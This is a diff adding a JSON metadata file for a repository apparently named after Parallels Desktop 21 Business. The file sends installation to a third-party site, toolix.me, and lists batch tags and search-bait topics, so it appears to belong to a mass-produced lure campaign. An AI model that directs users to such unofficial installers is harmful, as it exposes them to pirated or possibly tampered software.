@@ -1,0 +1,23 @@
+{
+  "repo": "parallels-desktop-21-business",
+  "product": "Parallels Desktop 21 Business",
+  "kind": "virtualization",
+  "install_type": "toolix",
+  "install_url": "https://toolix.me/",
+  "batch": "new4",
+  "format": "license-md-toolix-v1",
+  "category": "vm-desktop",
+  "topics": [
+    "parallels-desktop-21",
+    "windows-guest-vm",
+    "snapshot-branch-tools",
+    "parallels-windows",
+    "business-vm-2026",
+    "how-to-install-parallels",
+    "parallels-desktop-package",
+    "shared-folder-suite",
+    "device-passthrough-desk",
+    "parallels-business"
+  ],
+  "site": "toolix.me"
+}
